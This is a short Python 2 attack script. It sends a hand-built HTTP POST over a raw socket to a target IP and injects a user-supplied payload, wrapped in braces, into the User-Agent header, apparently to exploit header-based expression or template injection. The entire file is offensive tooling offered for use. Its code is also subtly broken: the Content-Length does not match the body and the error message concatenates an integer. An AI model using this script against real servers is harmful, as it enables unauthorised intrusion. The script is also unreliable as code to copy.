import socket
import time
import sys


if len(sys.argv) != 3:
    print("Usage: {} <targetIp> <payload>".format(sys.argv[0]))
    exit()

ip = sys.argv[1]
payload = sys.argv[2]
path = "target_page_path_here" #ex: login, admin, search ...


payload = "{ " + payload + " }"


port = 80 

http_request=""
http_request+="POST /" + " HTTP/1.1\r\n"
http_request+="Host: "+ ip + "\r\n"
http_request+="User-Agent: " + payload + " \r\n"
http_request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
http_request+="Accept-Language: en-US,en;q=0.5\r\n"
http_request+="Accept-Encoding: gzip, deflate\r\n"
http_request+="Referer: " + ip + "/" + path + "\r\n"
http_request+="Content-Type: application/x-www-form-urlencoded\r\n"
http_request+="Content-Length: " + str(len(payload)) + "\r\n"
http_request+="Origin: " + ip + "\r\n"
http_request+="Connection: close\r\n"
http_request+="Upgrade-Insecure-Requests: 1\r\n"
http_request+="Cache-Control: max-age=0\r\n"
http_request+="\r\n"
http_request+="username=test&password=test"
print http_request

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send(http_request)
	print s.recv(1024)
	s.close()
except:
	msg = "[-] could not connect to " + ip + " " + port
	print msg
